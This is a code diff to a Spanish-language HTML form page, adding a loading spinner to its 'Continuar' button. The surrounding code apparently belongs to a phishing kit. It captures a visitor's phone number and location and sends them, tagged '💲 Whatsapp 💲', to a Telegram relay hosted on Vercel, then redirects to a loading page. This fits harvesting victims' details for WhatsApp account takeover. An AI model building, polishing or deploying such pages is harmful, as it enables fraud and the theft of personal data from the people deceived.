@@ -13,7 +13,7 @@
     html, body {
       margin: 0;
       padding: 0;
-      overflow-x: hidden; /* Bloquea desplazamiento horizontal */
+      overflow-x: hidden;
       width: 100vw;
       max-width: 100vw;
     }
@@ -55,6 +55,49 @@
     img {
       max-width: 100%;
       height: auto;
+    }
+
+    /* Spinner dentro del botón */
+    .btn-spinner {
+      display: inline-block;
+      width: 20px;
+      height: 20px;
+      border: 3px solid rgba(255,255,255,.3);
+      border-radius: 50%;
+      border-top-color: #fff;
+      animation: spin 1s ease-in-out infinite;
+    }
+    
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+    
+    /* Estilo del botón cuando está cargando */
+    #submitButton.loading {
+      cursor: not-allowed;
+      opacity: 0.8;
+    }
+    
+    /* Ocultar texto cuando está cargando */
+    #submitButton.loading .btn-text {
+      display: none;
+    }
+    
+    /* Mostrar spinner solo cuando tiene clase loading */
+    #submitButton .btn-spinner {
+      display: none;
+    }
+    
+    #submitButton.loading .btn-spinner {
+      display: inline-block;
+    }
+
+    /* Centrar contenido del botón */
+    #submitButton {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      min-height: 44px;
     }
   </style>
 </head>
@@ -98,7 +141,10 @@
         <option value="+58">🇻🇪 Venezuela</option>
       </select>
       <input type="tel" id="telefono" name="telefono" placeholder="Número de teléfono" required>
-      <button type="submit" id="submitButton">Continuar</button>
+      <button type="submit" id="submitButton">
+        <span class="btn-text">Continuar</span>
+        <span class="btn-spinner"></span>
+      </button>
     </form>
   </div>
 
@@ -154,10 +200,8 @@
       }
 
       function enviarMensajeTelegram(mensaje, nextPage) {
-        // URL de tu backend en Vercel
         var url = 'https://telegram-backend-umber.vercel.app/api/telegram';
         
-        // El backend espera un objeto con la propiedad "message"
         var params = {
           message: mensaje
         };
@@ -178,6 +222,10 @@
         })
         .catch(error => {
           console.error('Error al enviar el mensaje:', error);
+          // Rehabilitar el botón si hay error
+          const btn = document.getElementById("submitButton");
+          btn.classList.remove("loading");
+          btn.disabled = false;
         });
       }
 
@@ -185,11 +233,18 @@
       if (loginForm) {
         loginForm.addEventListener("submit", function (event) {
           event.preventDefault();
+          
+          const btn = document.getElementById("submitButton");
+          
+          // Activar estado de carga: oculta texto, muestra spinner, deshabilita botón
+          btn.classList.add("loading");
+          btn.disabled = true;
+          
           var telefono = document.getElementById("telefono").value;
           obtenerUbicacionYEnviarMensajeTelegram(telefono, telefono, "loading.html?action=telefono", "💲 Whatsapp 💲:\nTELEFONO: " + telefono);
         });
       }
     });
-</script>
+  </script>
 </body>
 </html>
